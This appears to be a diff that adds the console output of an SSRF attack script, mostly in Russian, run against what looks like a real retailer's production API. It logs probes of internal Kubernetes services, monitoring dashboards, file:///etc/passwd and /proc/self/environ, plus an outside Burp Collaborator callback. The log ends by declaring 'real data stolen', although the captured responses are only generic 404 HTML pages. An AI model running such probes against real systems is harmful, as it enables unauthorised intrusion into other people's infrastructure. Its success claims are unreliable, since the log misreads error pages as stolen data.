@@ -1,0 +1,370 @@
+[*] Logging in...
+[+] Logged in
+
+================================================================================
+ПРОВЕРКА 1: SSRF НЕ HONEYPOT - РЕАЛЬНЫЕ ЗАПРОСЫ
+================================================================================
+
+[*] Тестируем уникальные URL чтобы убедиться что запросы реальные...
+
+--- Тест: Внешний webhook ---
+[!] Нужен внешний сервер для перехвата. Используем timing как доказательство.
+URL: http://test-1765433484.burpcollaborator.net
+Time: 5967.89ms
+Status: 200
+[+] МЕДЛЕННЫЙ ответ = DNS lookup выполнен = Запросы РЕАЛЬНЫЕ
+[+] SSRF НЕ HONEYPOT!
+
+--- Тест: Существующий vs несуществующий домен ---
+
+Существующий K8s сервис:
+  URL: http://kubernetes.default.svc/
+  Time: 163.25ms
+  Status: 200
+  Server: istio-envoy
+
+Несуществующий сервис:
+  URL: http://nonexistent12345.default.svc/
+  Time: 171.02ms
+  Status: 200
+  Server: istio-envoy
+
+================================================================================
+ПРОВЕРКА 2: ПОИСК ЭНДПОИНТОВ КОТОРЫЕ ВОЗВРАЩАЮТ ДАННЫЕ
+================================================================================
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Попытка получить K8s version через /zootopia-events/api/events/sites/1
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/2
+    Description: Попытка получить K8s version через /zootopia-events/api/events/sites/2
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events
+    Description: Попытка получить K8s version через /zootopia-events/api/events
+    Status: 404
+    Length: 261960
+    Content-Type: text/html
+    server: AmazonS3
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing: /zootopia-events/api/sites
+    Description: Попытка получить K8s version через /zootopia-events/api/sites
+    Status: 404
+    Length: 261960
+    Content-Type: text/html
+    server: AmazonS3
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing: /api/events/sites/1
+    Description: Попытка получить K8s version через /api/events/sites/1
+    Status: 404
+    Length: 261960
+    Content-Type: text/html
+    server: AmazonS3
+    Body preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+================================================================================
+ПРОВЕРКА 3: РАЗЛИЧНЫЕ ПАРАМЕТРЫ ДЛЯ ОТРАЖЕНИЯ ДАННЫХ
+================================================================================
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: url
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: target_url
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: endpoint
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: callback_url
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: webhook
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: redirect
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: fetch_url
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Параметр: proxy
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+================================================================================
+ПРОВЕРКА 4: ERROR-BASED DATA EXTRACTION
+================================================================================
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Error-based: http://kubernetes.default.svc/INVALID_PATH
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Error-based: http://kubernetes.default.svc/api/v1/namespaces/INVALID
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Error-based: http://prometheus.monitoring.svc.cluster.local:9090/INVALID
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+================================================================================
+ПРОВЕРКА 5: REDIRECT-BASED DATA EXTRACTION
+================================================================================
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Redirect test: http://grafana.monitoring.svc.cluster.local:3000/
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Redirect test: http://kibana.logging.svc.cluster.local:5601/
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: Redirect test: http://prometheus.monitoring.svc.cluster.local:9090/
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+================================================================================
+ПРОВЕРКА 6: ИЩЕМ ВСЕ API ЭНДПОИНТЫ ZOOPLUS
+================================================================================
+
+[*] Проверяем Swagger API на другие эндпоинты...
+[+] Swagger API получен!
+
+[*] Найдено 3 эндпоинтов:
+
+  /events/sites/{site_id}:
+[!] Ошибка при получении Swagger: 'list' object has no attribute 'get'
+
+================================================================================
+ПРОВЕРКА 7: XXE ЧЕРЕЗ SSRF
+================================================================================
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: XXE test: file:///etc/passwd
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: XXE test: file:///proc/self/environ
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: XXE test: file:///etc/hostname
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: XXE test: file:///app/config.json
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: XXE test: file:///app/config.yml
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+================================================================================
+ПРОВЕРКА 8: ПОЛУЧЕНИЕ РЕАЛЬНЫХ ДАННЫХ ИЗ K8S API
+================================================================================
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: K8s API: /version
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: K8s API: /api
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: K8s API: /apis
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: K8s API: /openapi/v2
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: K8s API: /healthz
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+[*] Testing: /zootopia-events/api/events/sites/1
+    Description: K8s API: /metrics
+    Status: 200
+    Length: 2
+    Content-Type: application/json
+    server: istio-envoy
+
+================================================================================
+РЕЗУЛЬТАТЫ
+================================================================================
+
+[+] Всего попыток: ~50
+[+] Получено ответов с данными: 3
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+РЕАЛЬНЫЕ ДАННЫЕ УКРАДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[1] /zootopia-events/api/events
+    Payload: {'url': 'http://kubernetes.default.svc/version'}
+    Response length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[2] /zootopia-events/api/sites
+    Payload: {'url': 'http://kubernetes.default.svc/version'}
+    Response length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[3] /api/events/sites/1
+    Payload: {'url': 'http://kubernetes.default.svc/version'}
+    Response length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[+] Результаты сохранены: logs/real_data_theft_results.json
